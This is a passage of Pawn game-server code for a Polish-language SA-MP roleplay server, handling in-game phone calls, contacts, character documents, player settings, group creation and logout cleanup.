						return ShowDialogInfo(playerid, "Aktualnie nie ma nikogo na s³u¿bie ¿adnego z biznesów.");
						return ShowPlayerDialog(playerid, D_911, DIALOG_STYLE_LIST, "Biznesy", list, "Zadzwoñ", "Anuluj");
					}
					case 444:
					{
						new phoneuid = pVal[playerid];
						new simuid = ItemCache[phoneuid][iVal];
						for(new i; i<LastContactUID; i++)
						{
							if(ContactCache[i][cNum] == simuid)
							{
								SendClientMessage(playerid, COLOR_YELLOW, "** Wiadomoœæ zwrotna **");
								new msg[128];
								format(msg, sizeof(msg), "Twój numer telefonu to: %d", ContactCache[i][cNum]+50000);
								return SendClientMessage(playerid, COLOR_YELLOW, msg);
							}
						}
					}
				}
				if(phone_number-50000 == pVal[playerid])
				{
					ShowDialogContacts(playerid); return TextDrawForPlayerEx(playerid, 1, "Nie mo¿esz zadzwoniæ do samego siebie.", 5000);
				}
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iType] == 2)
					{
						if(ItemCache[i][iVal] == phone_number-50000)
						{
							if(ItemCache[i][iState] == 0)
							{
								for(new j; j<=GetPlayerPoolSize(); j++)
								{
									if(IsPlayerConnected(j))
									{
										if(PlayerCache[j][pUID] == ItemCache[i][iOwner])
										{
											pCalling[j] = playerid;
											SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
											CallingTimer[playerid] = SetTimerEx("PlayerCalling", 7500, false, "ii", playerid, j);
											new msg[128]; format(msg, sizeof(msg), "* Dzwoni telefon %s. *", RPName(j));
											TextDrawForPlayerEx(j, 1, "Ktos do Ciebie dzwoni!~n~Uzyj ~y~/p [nazwa telefonu]~w~ by odebrac polaczenie!", 7500);
											Do(j, msg);
											return PlayerPlaySoundInRange(j, 23000, 5.0);
										}
									}
								}
							}
							return SendClientMessage(playerid, COLOR_GREEN, "#Operator Komórkowy: "HEX_WHITE"Abonent jest nieosi¹galny.");
						}
					}
				}
				SendClientMessage(playerid, COLOR_GREEN, "#Operator Komórkowy: "HEX_WHITE"Wprowadzono nieprawdi³owy numer telefonu.");
				return ShowDialogContacts(playerid);*/
			}
			return ShowDialogContacts(playerid);
		}
		case D_911:
		{
			if(response)
			{
				new group_uid = strval(inputtext);
				pVal2[playerid] = group_uid;
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
				new msg[128]; format(msg, sizeof(msg), "%s (telefon): %s.", RPName(playerid), GroupCache[group_uid][gName]);
				SendPlayerMessageInRange(playerid, msg, CHAT_SHADE_1, CHAT_SHADE_2, CHAT_SHADE_3, CHAT_SHADE_4, CHAT_SHADE_5, CHAT_SHADE_6, false);
				return ShowDialogApp(playerid);
			}
		}
		case D_CONTACTS:
		{
			new option = strval(inputtext);
			if(response)
			{
				switch(option)
				{
					case 1:
					{
						new phoneuid = pVal[playerid];
						new simuid = ItemCache[phoneuid][iVal];
						new list[1025], info[64];
						list = "Numer\tKontakt\n"HEX_YELLOW"777\tZamawianie produktów\n"HEX_RED"911\tNumer alarmowy\n"HEX_GREEN"555\tZadzwoñ do biznesu\n444\tSprawdŸ mój numer\n";
						for(new i; i<LastContactUID; i++)
						{
							if(ContactCache[i][cOwner] == simuid && ContactCache[i][cState] == 0)
							{
								format(info ,sizeof(info), "%d\t%s\n", ContactCache[i][cNum] + 50000, ContactCache[i][cName]);
								strins(list, info, strlen(list));
							}
						}
						return ShowPlayerDialog(playerid, D_PLAYER_CONTACTS, DIALOG_STYLE_TABLIST_HEADERS, "Twoje kontakty", list, "Zadzwoñ", "Anuluj");
					}
					case 2:
					{
						return ShowPlayerDialog(playerid, D_NEW_CONTACT, DIALOG_STYLE_INPUT, "Nowy kontakt", "Wpisz poni¿ej numer oraz nazwê dla nowego kontaktu w formacie: [numer] [nazwa]\nPrzyk³ad: 55555 Jane Smith", "Dodaj", "Anuluj");
					}
					case 3:
					{
						new phoneuid = pVal[playerid];
						new simuid = ItemCache[phoneuid][iVal];
						new list[256], info[64];
						for(new i; i<LastContactUID; i++)
						{
							if(ContactCache[i][cOwner] == simuid && ContactCache[i][cState] == 0)
							{
								format(info ,sizeof(info), "%d\t%s\n", ContactCache[i][cNum] + 50000, ContactCache[i][cName]);
								strins(list, info, strlen(list));
							}
						}
						if(Isnull(list))
						return ShowDialogInfo(playerid, "Nie posiadsz ¿adnych kontaktów w swoim telefonie.");
						return ShowPlayerDialog(playerid, D_REMOVE_CONTACT, DIALOG_STYLE_LIST, "Wybierz kontakt do usuniêcia", list, "Usuñ", "Anuluj");
					}
				}
			}
			return ShowDialogPhone(playerid);
		}
		case D_ADD_CONTACT:
		{
			new senderuid = tVal[playerid];
			/*if(!IsPlayerConnected(senderi))
			return SendClientMessage(playerid, COLOR_GRAY, "Oferuj¹cy opuœci³ grê.");*/
			new senderid;
			for(new i; i<=GetPlayerPoolSize(); i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerCache[i][pUID] == senderuid)
					{
						senderid = i;
					}
				}
			}
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogAddContact(playerid);
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iType] == 2)
					{
						if(ItemCache[i][iActive])
						{
							if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
							{
								for(new j=1; j<MAX_ITEMS; j++)
								{
									if(ItemCache[j][iOwner] == senderuid)
									{
										if(ItemCache[j][iActive])
										{
											if(ItemCache[j][iType] == 2)
											{	
												TextDrawForPlayerEx(senderid, 1, "~g~~h~Oferta zaakceptowana.", 3000);
												AddContact(ItemCache[i][iVal], inputtext, ItemCache[j][iVal]);
												return TextDrawForPlayerEx(playerid, 1, "Nowy kontakt zostal dodany do Twojego telefonu.", 3000);
											}
										}
									}
								}
							}
						}
					}
				}
			}
			else
			{
				TextDrawForPlayerEx(playerid, 1, "Anulowano oferte.", 3000);
				return TextDrawForPlayerEx(senderid, 1, "~r~~h~Oferta anulowana.", 3000);
			}
			return 1;
		}
		case D_REMOVE_CONTACT:
		{
			if(response)
			{
				new contactid = strval(inputtext) - 50000;
				for(new i; i<LastContactUID; i++)
				{
					if(ContactCache[i][cNum] == contactid)
					{
						ContactCache[i][cState] = 1;
						new str[64]; format(str, sizeof(str), "Usunieto kontakt %s.", ContactCache[i][cName]);
						TextDrawForPlayerEx(playerid, 1, str, 3000);
					}
				}
			}
			return ShowDialogContacts(playerid);
		}
		case D_VCARD:
		{
			if(response)
			{
				new targetuid= strval(inputtext);
				/*if(!PlayerCache[targetuid][uOnline])
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");*/
				new targetid;
				for(new i; i<=GetPlayerPoolSize(); i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerCache[i][pUID] == targetuid)
						targetid = i;
					}
				}
				new Float:X, Float:Y, Float:Z; GetPlayerPos(playerid, X, Y,Z);
				if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid) || !IsPlayerInRangeOfPoint(targetid, 5.0, X, Y ,Z))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");
				if(GetPlayerPhoneNumber(targetid) == 0)
				{
					TextDrawForPlayerEx(playerid, 1, "Ta osoba nie ma telefonu lub jest on wylaczony.", 5000);
					return ShowDialogVCard(playerid);
				}
				for(new i; i<LastContactUID; i++)
				{
					if(ContactCache[i][cState] == 0)
					{
						if(ContactCache[i][cOwner] == GetPlayerPhoneNumber(playerid))
						{
							if(ContactCache[i][cNum] == GetPlayerPhoneNumber(targetid))
							return SendClientMessage(playerid, COLOR_GRAY, "Posiadasz ju¿ ten kontakt w swoim telefonie.");
						}
					}
				}
				TextDrawForPlayerEx(playerid, 1, "Oferta wyslana.", 5000);
				tVal[targetid] = PlayerCache[playerid][pUID];
				return ShowDialogVCardAccept(targetid);
			}
		}
		case D_VCARD_ACCEPT:
		{
			new senderuid = tVal[playerid];
			new targetid = -1;
			for(new i; i<=GetPlayerPoolSize(); i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerCache[i][pUID] == senderuid)
					{
						targetid = i;
					}
				}
			}
			if(response)
			{
				if(targetid == -1)
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz wylogowa³ siê lub wyszed³ z gry.");
				new Float:X, Float:Y, Float:Z; GetPlayerPos(targetid, X, Y, Z);
				if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(targetid) || !IsPlayerInRangeOfPoint(playerid, 5.0, X, Y, Z))
				return SendClientMessage(playerid, COLOR_GRAY, "Gracz oddali³ siê.");
				for(new i; i<MAX_ITEMS; i++)
				{
					if(ItemCache[i][iState] == 0)
					{
						if(ItemCache[i][iType] == 2)
						{
							if(ItemCache[i][iActive])
							{
								if(ItemCache[i][iOwner] == senderuid)
								{
									return ShowDialogAddContact(playerid);
								}
							}
						}
					}
				}
				return SendClientMessage(playerid, COLOR_GRAY, "Wybrany gracz nie posiada telefonu lub jest on wy³¹czony.");
			}
			else
			{
				if(targetid != -1)
				{
					TextDrawForPlayerEx(targetid, 1, "~r~Oferta anulowana.", 5000);
					return TextDrawForPlayerEx(playerid, 1, "~r~~h~Oferta anulowana.", 5000);
				}
			}
		}
		case D_ZONE:
		{
			if(response)
			{
				new zoneid = GetPlayerZone(playerid);
				ShowDialogDoorCreate(playerid, ZoneData[zoneid][zYard]);
				return 1;
			}
			else
			{
				return 1;
			}
		}
		case D_STATS:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1:	return ShowDialogSettings(playerid);
					case 2: return ShowPlayerDialog(playerid, D_SERVICES, DIALOG_STYLE_LIST, "Us³ugi", ""HEX_WHITE"1\tStwórz grupê", "Wybierz", "Anuluj");
					case 3:
					{
						new query[128];
						format(query, sizeof(query), "SELECT * FROM playerDocs WHERE playerUID=%d;", PlayerCache[playerid][pUID]);
						new Cache:cache = mysql_query(DB_HANDLE, query);

						new rows = cache_num_rows();
						
						if(!rows){
							return ShowDialogInfo(playerid, "Twoja postaæ nie posiada ¿adnych dokumentów.\n"HEX_YELLOW"Wyrobiæ je mo¿e w urzêdzie miasta jak i w wielu ró¿nych sytuacjach RolePlay.");
						}
						new documents[256], info[128];

						new type = 0;
						new uid = 0;

						for(new i=0; i<rows; i++){
							
							cache_get_value_name_int(i, "type", type);
							cache_get_value_name_int(i, "uid", uid);
							switch(type){
								case DOC_TYPE_DRIVING_LICENSE:{
									format(info, sizeof(info), "%d\tPrawo jazdy\n", uid);
								}
								case DOC_TYPE_FISHING_RIGHT:{
									format(info, sizeof(info), "%d\tLicencja wêdkarska\n", uid);
								}
								case DOC_TYPE_ID:{
									format(info, sizeof(info), "%d\tDowód osobisty\n", uid);
								}
								case DOC_TYPE_NO_CRIMINAL_RECORD:{
									format(info, sizeof(info), "%d\tNiekaralnoœæ\n", uid);
								}
								case DOC_TYPE_SANITY:{
									format(info, sizeof(info), "%d\tPoczytalnoœæ\n", uid);
								}
								case DOC_TYPE_INSANITY:{
									format(info, sizeof(info), "%d\tNiepoczytalnoœæ\n", uid);
								}
							}
							strins(documents, info, strlen(documents));
						}
						
						cache_delete(cache);
						if(strlen(documents))
						return ShowPlayerDialog(playerid, D_DOCUMENTS, DIALOG_STYLE_LIST, "Dokumenty Twojej postaci", documents, "Wybierz", "Anuluj");
					}
					case 4: return ShowDialogConnects(playerid);
				}
			}
			return 1;
		}
		case D_CONNECT:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1: 
					{
						if(pFreeze[playerid])
						{
							pFreeze[playerid] = false;
							ShowDialogConnects(playerid);
							return TextDrawForPlayerEx(playerid, 1, "~r~~h~Przelaczono ~w~freeze przez drzwi.", 3000);
						}
						pFreeze[playerid] = true;
						ShowDialogConnects(playerid);
						return TextDrawForPlayerEx(playerid, 1, "~g~~h~Przelaczono ~w~freeze przez drzwi.", 3000);
					}
					case 2:
					{
						if(PlayerCache[playerid][pOOC])
						{
							PlayerCache[playerid][pOOC] = false;
							ShowDialogConnects(playerid);
							return TextDrawForPlayerEx(playerid, 1, "~r~~h~Przelaczono ~w~czat OOC.", 3000);
						}
						PlayerCache[playerid][pOOC] = true;
						ShowDialogConnects(playerid);
						return TextDrawForPlayerEx(playerid, 1, "~g~~h~Przelaczono ~w~czat OOC.", 3000);
					}
					case 3:
					{
						new list[2025], info[128];
						list = ""HEX_RED"-1\tWy³¹cz animacjê na przycisk\n";
						for(new i; i<MAX_ANIMS; i++)
						{
							if(Isnull(AnimList[i+1][aName]))
							break;		
							format(info, sizeof(info), "%d\t//%s\n", i, AnimList[i][aCustomName]);
							strins(list, info, strlen(list));
						}
						return ShowPlayerDialog(playerid, D_SETANIM, DIALOG_STYLE_LIST, "Wybierz animacjê na przycisk", list, "Ustaw", "Anuluj");
					}
					case 4:
					{
						return ShowDialogInfo(playerid, "Powiedz hajpowi zeby zrobil to (nicki ooc)");
					}
					case 5:
					{
						if(PlayerCache[playerid][pObjectEditor])
						{
							PlayerCache[playerid][pObjectEditor] = 0;
							GameTextForPlayer(playerid, "~w~edytor obiektow:~n~~y~klawisze", 2500, 4);
						}
						else
						{
							PlayerCache[playerid][pObjectEditor] = 1;
							GameTextForPlayer(playerid, "~w~edytor obiektow:~n~~y~suwak", 2500, 4);
						}
						return ShowDialogConnects(playerid);
					}
				}
			}
		}
		case D_SETTINGS:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1: ShowDialogInfo(playerid, "Kupka");
				}
			}
			return 1;
		}
		case D_SERVICES:
		{
			if(response)
			{
				new option = strval(inputtext);
				switch(option)
				{
					case 1:
					{
						if(PlayerCache[playerid][pScore] < 1000)
						return SendClientMessage(playerid, COLOR_WHITE, "Nie posiadasz 1000 SP do stworzenia grupy.");
						return ShowDialogCreateGroup(playerid);
					}
				}
			}
			return 1;
		}
		case D_CREATE_GROUP:
		{
			if(response)
			{
				if(Isnull(inputtext))
				return ShowDialogCreateGroup(playerid);
				new string[64]; format(string, sizeof(string), " %s", inputtext);
				new type, name[32];
				if(sscanf(string, "is[32]", type, name))
				return ShowDialogCreateGroup(playerid);
				if(type != 0) return ShowDialogCreateGroup(playerid);
				if(strlen(name) > 32)
				return ShowDialogCreateGroup(playerid);
				if(!GetPlayerFreeSlot(playerid))
				return SendClientMessage(playerid, COLOR_GRAY, "Brak wolnych slotów grupowych! Musisz opuœciæ jak¹œ grupê. Mo¿esz u¿yæ komendy /g [slot grupy] [opuœæ] by opuœciæ grupê.");
				CreateGroup(type, name, "ffffff", 5);
				new uid = PlayerCache[playerid][pUID]; PlayerCache[uid][pScore] -= 1000;
				SetPlayerScore(playerid, PlayerCache[uid][pScore]);
				TextDrawForPlayerEx(playerid, 1, "Grupa zostala utworzona pomyslnie!~n~Uzyj ~y~/g [slot] panel~w~ by zarzadzac grupa.", 5000);
			}
			return 1;
		}
	}
	return 0;
}

stock GetPlayersCountOnDuty(groupuid)
{
	new count;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(pDuty[i] == groupuid)
			{
				count++;
			}
		}
	}
	return count;
}

stock GetUserPerms(useruid, groupuid)
{
	/*new perms[128];
	if(PlayerCache[useruid][pGroup] == groupuid)
	{
		if(PlayerCache[useruid][pGroupAdmin])
		strins(perms, "+A ", strlen(perms));
		if(PlayerCache[useruid][pGroupMapper])
		strins(perms, "+B ", strlen(perms));
		if(PlayerCache[useruid][pGroupInvite])
		strins(perms, "+C ", strlen(perms));
		if(PlayerCache[useruid][pGroupDoor])
		strins(perms, "+D ", strlen(perms));
		if(PlayerCache[useruid][pGroupVehicle])
		strins(perms, "+E ", strlen(perms));
		if(PlayerCache[useruid][pGroupProducts])
		strins(perms, "+F ", strlen(perms));
	}
	else if(PlayerCache[useruid][pGroup2] == groupuid)
	{
		if(PlayerCache[useruid][pGroupAdmin2])
		strins(perms, "+A ", strlen(perms));
		if(PlayerCache[useruid][pGroupMapper2])
		strins(perms, "+B ", strlen(perms));
		if(PlayerCache[useruid][pGroupInvite2])
		strins(perms, "+C ", strlen(perms));
		if(PlayerCache[useruid][pGroupDoor2])
		strins(perms, "+D ", strlen(perms));
		if(PlayerCache[useruid][pGroupVehicle2])
		strins(perms, "+E ", strlen(perms));
		if(PlayerCache[useruid][pGroupProducts2])
		strins(perms, "+F ", strlen(perms));
	}
	else if(PlayerCache[useruid][pGroup3] == groupuid)
	{
		if(PlayerCache[useruid][pGroupAdmin3])
		strins(perms, "+A ", strlen(perms));
		if(PlayerCache[useruid][pGroupMapper3])
		strins(perms, "+B ", strlen(perms));
		if(PlayerCache[useruid][pGroupInvite3])
		strins(perms, "+C ", strlen(perms));
		if(PlayerCache[useruid][pGroupDoor3])
		strins(perms, "+D ", strlen(perms));
		if(PlayerCache[useruid][pGroupVehicle3])
		strins(perms, "+E ", strlen(perms));
		if(PlayerCache[useruid][pGroupProducts3])
		strins(perms, "+F ", strlen(perms));
	}
	return perms;*/
}

stock ReturnFavAnim(playerid)
{
	new str[64];
	if(Isnull(PlayerCache[playerid][pFavAnim]))
	str = ""HEX_RED"Nie";
	else
	format(str, sizeof(str), ""HEX_GREEN"%s",PlayerCache[playerid][pFavAnim]);
	return str;
}

stock ShowDialogSettings(playerid)
{
	new str[256];
	format(str, sizeof(str), ""HEX_WHITE"1\tZmieñ has³o logowania");
	return ShowPlayerDialog(playerid, D_SETTINGS, DIALOG_STYLE_LIST, "Ustawienia postaci", str , "Wybierz", "Anuluj");
}

stock ShowDialogConnects(playerid)
{
	new str[256];
	format(str, sizeof(str), "1\tFreeze przy przejœciu: %s\n2\tCzat OOC: %s\n3\tAnimacja na przycisk: %s\n4\tNick OOC: %s\n5\tEdytor obiektów: "HEX_YELLOW"%s", pFreeze[playerid] ? (""HEX_GREEN"Tak") : (""HEX_RED"Nie"), PlayerCache[playerid][pOOC] ? (""HEX_GREEN"Tak") : (""HEX_RED"Nie"), ReturnFavAnim(playerid), "soon", PlayerCache[playerid][pObjectEditor] ? ("Suwak") : ("Klawisze"));
	return ShowPlayerDialog(playerid, D_CONNECT, DIALOG_STYLE_LIST, "Prze³¹czniki postaci", str , "Wybierz", "Anuluj");
}

stock LogoutPlayer(playerid)
{
	pLogged[playerid] = false;
	// Killing detonator timer
	KillTimer(pDetonatorTimer[playerid]);
	pDetonatorTimer[playerid] = 0;

	// Killing choosing clotches timer
	KillTimer(pClotchesTimer[playerid]);
	pClotchesTimer[playerid] = 0;

	// Killing Bus Timer
	KillTimer(BusTimer[playerid]);
	BusTimer[playerid] = 0;

	// Some clearing
	pMessageCount[playerid] = 0;
	pCommandCount[playerid] = 0;
	LoginAttempt[playerid] = 0;

	// Clearing all attached objects
	for(new i=0; i<10; i++)
	{
		if(IsPlayerAttachedObjectSlotUsed(playerid, i))
		RemovePlayerAttachedObject(playerid, i);
	}

	// Killing training stuff
	if(pTrainingTimer[playerid])
	{
		KillTimer(pTrainingTimer[playerid]);
		pTrainingTimer[playerid] = 0;
		pTrainingState[playerid] = 0;
		pTrainingExtrude[playerid] = 0;
		pHoldingBar[playerid] = 0;
	}

	new query[128];

	for(new i; i<MAX_ITEMS; i++)
	{
		if(!ItemCache[i][iUID])
		break;
		if(ItemCache[i][iState] == ITEM_STATE_DRIVING)
		{
			if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
			{
				ItemCache[i][iOwner] = 0;
				DestroyDynamicMapIcon(pMapIcon[playerid]);
				pGetPack[playerid] = false;

				format(query, sizeof(query), "UPDATE items SET owner = '0' WHERE uid = '%d'", i);
				mysql_query(DB_HANDLE, query);
			}
		}
	}
	format(query, sizeof(query), "%s\n(( /login ))", RPName(playerid));

	GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]);

	pText[playerid] = CreateDynamic3DTextLabel(query, PLAYER_NORMAL_COLOR,PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ], 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, GetPlayerVirtualWorld(playerid), 0, -1);

	SetTimerEx("HideIt", 1000*15, false, "i", playerid);

	if(pGPSTimer[playerid])
	{
		KillTimer(pGPSTimer[playerid]);
		pGPSTimer[playerid] = 0;
	}
	if(pTalking[playerid] != -1)
	{
		SetPlayerSpecialAction(pTalking[playerid], SPECIAL_ACTION_STOPUSECELLPHONE);
		pTalking[playerid] = -1;
	}
	if(pBelts[playerid])
	pBelts[playerid] = false;
	if(PlayerCache[playerid][pAJ_Time] == 0)
	{
		GetPlayerPos(playerid, PlayerCache[playerid][pPosX], PlayerCache[playerid][pPosY], PlayerCache[playerid][pPosZ]); 
		PlayerCache[playerid][pPosVW] = GetPlayerVirtualWorld(playerid);
	}

	KillTimer(PlayerRepairingVehicle[playerid][repairTimer]);

	DestroyDynamic3DTextLabel(pDesc[playerid][dID]); // Destroy his description
	pDesc[playerid][dID] = Text3D:0;
	pDesc[playerid][dIsDescOnPlayer] = false;

	for(new i; i<MAX_ITEMS; i++)
	{
		if(!ItemCache[i][iUID])
		break;
		if(ItemCache[i][iOwner] == PlayerCache[playerid][pUID])
		{
			if(ItemCache[i][iActive])
			{
				if(ItemCache[i][iType] != 2)
				{
					if(ItemCache[i][iType] == 1)
					ResetPlayerWeapons(playerid);
					ItemCache[i][iActive]=0;
					format(query, sizeof(query), "UPDATE items SET active = '0' WHERE uid = '%d'", i);
					mysql_query(DB_HANDLE, query);
				}
			}
		}
	}

	ObjectCache[playerid][oUID] = 0;
	// Clear phone calling
	if(CallData[playerid][cCaller] != -1 && !CallData[playerid][cCalling])
	{
		new callerid = CallData[playerid][cCaller];
		SetPlayerSpecialAction(callerid, 13);
		SendClientMessage(callerid, -1, "Rozmówca roz³¹czy³ siê.");
		CallData[callerid][cCaller] = -1;
	}
	CallData[playerid][cCalling] = 0;
	CallData[playerid][cCaller] = -1;
	pDuty[playerid] = 0;
	pChoosingTxd[playerid] = 0;
	aduty[playerid] = 0;
	ac[playerid] = false;
	SetTimerEx("ClearPos", 60000*10, false, "i", PlayerCache[playerid][pUID]);

	TogglePlayerSpectating(playerid, 1);

	ShowDialogLogin(playerid);

	return 1;
}

stock ShowDialogCreateGroup(playerid)
return ShowPlayerDialog(playerid, D_CREATE_GROUP, DIALOG_STYLE_INPUT, "Stwórz grupê", ""HEX_WHITE"Podaj rodzaj oraz nazwê grupy.\nWzór: [liczba] [nazwa]\nGdzie:\n"HEX_RED"0"HEX_WHITE" - Party", "Stwórz", "Anuluj");

stock ShowDialogVCardAccept(playerid)
{
	new senderuid = tVal[playerid];
	new senderid;
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(IsPlayerConnected(i))
		{
			if(senderuid == i)
			{
				senderid = i;
			}
		}
	}
	new str[256];
	format(str, sizeof(str), ""HEX_YELLOW"%s"HEX_WHITE" wysy³a Ci swój numer.\nCzy chcesz dodaæ go jako kontakt do swojego telefonu?", strreplace(ReturnPlayerName(senderid), '_', ' '));
	return ShowPlayerDialog(playerid, D_VCARD_ACCEPT, DIALOG_STYLE_MSGBOX, "Oferta", str, "Tak", "Nie");
}

stock ShowDialogVCard(playerid)
{
	new Float:X, Float:Y, Float:Z, vw = GetPlayerVirtualWorld(playerid); GetPlayerPos(playerid, X, Y, Z);
	new list[256], info[256];
	for(new i; i<=GetPlayerPoolSize(); i++)
	{
		if(i == playerid)
		continue;
		if(IsPlayerConnected(i))
		{
			if(GetPlayerVirtualWorld(i) == vw)
			{
				if(IsPlayerInRangeOfPoint(i, 5.0, X, Y, Z))
				{
					format(info, sizeof(info), "%d\t%s\n", PlayerCache[i][pUID], strreplace(ReturnPlayerName(i), '_', ' '));
					strins(list, info, strlen(list));
				}
			}
		}
	}
	if(!strlen(list))
	return ShowDialogInfo(playerid, "Nie znaleziono ¿adnych graczy w Twoim pobli¿u.");
	return ShowPlayerDialog(playerid, D_VCARD, DIALOG_STYLE_LIST, "Telefon > Kontakty > Wyœlij VCard", list, "Wyœlij", "Anuluj");
}

stock ShowDialogGroupPayDay(playerid)
{
	return ShowPlayerDialog(playerid, D_GROUP_PAYDAY, DIALOG_STYLE_INPUT, "Opcje grupy > Domyœlna wyp³ata", "Wpisz poni¿ej domyœln¹ wyp³atê jak¹ bêd¹ dostawaæ nowi cz³onkowie grupy.\nMo¿esz zmieniæ wyp³atê poszczególnym osobom wybieraj¹c j¹ z listy cz³onków.\n\
	To ile mo¿esz ustawiæ domyœlnej wyp³aty lub wyp³aty dla danego cz³onka jest zale¿ne od rodzaju Twojej grupy:", "Gotowe", "Anuluj");
}

stock ShowDialogVehicleGroup(playerid)
{
	/*new list[128] = "#\tGrupa\n", info[64], uid = PlayerCache[playerid][pUID];
	if(PlayerCache[uid][pGroup])
	{
		format(info, sizeof(info), "%d %s\n", PlayerCache[uid][pGroup], GroupCache[PlayerCache[uid][pGroup]][gName]);
		strins(list, info, strlen(list));
	}
	if(PlayerCache[uid][pGroup2])
	{
		format(info, sizeof(info), "%d %s\n", PlayerCache[uid][pGroup2], GroupCache[PlayerCache[uid][pGroup2]][gName]);
		strins(list, info, strlen(list));
	}
	if(PlayerCache[uid][pGroup3])
	{
		format(info, sizeof(info), "%d %s\n", PlayerCache[uid][pGroup3], GroupCache[PlayerCache[uid][pGroup3]][gName]);
		strins(list, info, strlen(list));
	}*/
	//return ShowPlayerDialog(playerid, D_VEHICLE_GROUP, DIALOG_STYLE_TABLIST_HEADERS, "Wybierz grupê", list, "Pod(od)pisz", "Anuluj");
}

stock ShowDialogGroupPanel(playerid)
{
	new uid = pVal[playerid];
	new str[1000];
	format(str, sizeof(str), "Nazwa grupy: %s\n\
	Kolor: {%s}%s\n\
	UID: %d\n\
	Typ grupy: %s\n\
	Limit pojazdów: %d\n\
	Bank: "HEX_GREEN"%d$\n\
	---\n\
	1 Lista cz³onków\n\
	2 Opcje", GroupCache[uid][gName], GroupCache[uid][gColor], GroupCache[uid][gColor], uid, GetGroupType(GroupCache[uid][gType]), GroupCache[uid][gVehicleLimit], GroupCache[uid][gBank]);
	new header[64]; format(header, sizeof(header), "Informacje o grupie", GroupCache[uid][gName], uid);
	return ShowPlayerDialog(playerid, D_GROUP_PANEL, DIALOG_STYLE_LIST, header, str, "Wybierz", "Anuluj");
}

stock AddContact(owner, const name[], num)
{
	new str[128]; format(str, sizeof(str), name);
	ContactCache[LastContactUID][cOwner] = owner;
	ContactCache[LastContactUID][cName] = str;
	ContactCache[LastContactUID][cState] = 0;
	ContactCache[LastContactUID][cNum] = num;
	LastContactUID++;
	return 1;
}

stock ShowDialogAddContact(playerid)
return ShowPlayerDialog(playerid, D_ADD_CONTACT, DIALOG_STYLE_INPUT, "Dodaj VCard", ""HEX_WHITE"Podaj nazwê kontaktu:\n\nPamiêtaj by nie podawaæ imion oraz nazwisk postaci, których Twoja postaæ nie pozna³a. ", "Dodaj", "Anuluj");

stock ShowDialogContacts(playerid)
return ShowPlayerDialog(playerid, D_CONTACTS, DIALOG_STYLE_LIST, "Telefon > Kontakty", "1\tMoje kontakty\n"HEX_BLUE"2\tDodaj nowy kontakt\n"HEX_RED"3\tUsuñ kontakt", "Wybierz", "Anuluj");

stock PlayerPlaySoundInRange(playerid, soundid, Float:range)
{
	new Float:X, Float:Y, Float:Z, vw = GetPlayerVirtualWorld(playerid); GetPlayerPos(playerid, X, Y, Z);
	for(new i=0; i<=GetPlayerPoolSize(); i++)
	{
		if(vw == GetPlayerVirtualWorld(i))
		{
			if(IsPlayerInRangeOfPoint(i, range, X, Y, Z))
			{
				PlayerPlaySound(i, soundid, 0.0, 0.0, 0.0);
			}
		}
	}
	return 1;
}

forward GiveWeapon(playerid, weaponid, ammo);
public GiveWeapon(playerid, weaponid, ammo)
{
	GivePlayerWeapon(playerid, weaponid, ammo);
}

forward PlayerCalling(playerid, targetid);
public PlayerCalling(playerid, targetid)
{	
	pCalling[playerid] = -1;
	if(!pLogged[targetid])
	return 1;
	if(pTalking[playerid] == -1)
	{
		SendClientMessage(playerid, COLOR_GRAY, "Rozmówca nie odebra³ telefonu.");
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
	}
	return 1;
}

stock ShowDialogCall(playerid)
return ShowPlayerDialog(playerid, D_CALL, DIALOG_STYLE_INPUT, "Telefon > Zadzwoñ pod numer", "WprowadŸ numer telefonu osoby do, której chcesz zadzwoniæ.\nNp. "HEX_GREEN"500914", "Zadzwoñ", "Anuluj");

stock ShowDialogSMS(playerid)
return ShowPlayerDialog(playerid, D_SMS, DIALOG_STYLE_INPUT, "Telefon > Wyœlij SMS", ""HEX_WHITE"Podaj numer na jaki chcesz wys³aæ wiadomoœæ SMS, nastêpnie jego treœæ.\nNp. "HEX_GREEN"523414 "HEX_WHITE"Czeœæ Lucy!", "Wyœlij", "Anuluj");

stock SetPlayerCash(playerid, cash)
{
	PlayerCache[playerid][pCash] += cash;
	GivePlayerMoney(playerid, cash);
	return 1;
}

stock CreateDoor(ownerid, outVW, type, Float:X, Float:Y, Float:Z)
{
	/*new VW=1, name[32];
	for(new i; i<LastdUID; i++)
	{
		if(VW == DoorCache[i][dInsVW])
		{
			VW++;
		}
	}
	DoorCache[LastdUID][dUID] = LastdUID;
	DoorCache[LastdUID][dType] = type;
	if(type)
	{
		name = "Biznes";
		DoorCache[LastdUID][dName] = name;
	}
	else
	{
		name = "Dom";
		DoorCache[LastdUID][dName] = name;
		if(PlayerCache[ownerid][pHouseSpawn] == 0)
		{
			PlayerCache[ownerid][pHouseSpawn] = LastdUID;
			SendClientMessage(ownerid, COLOR_GRAY, "Od teraz bêdziesz spawnowaæ siê w tym budynku.");
		}
		else
		{
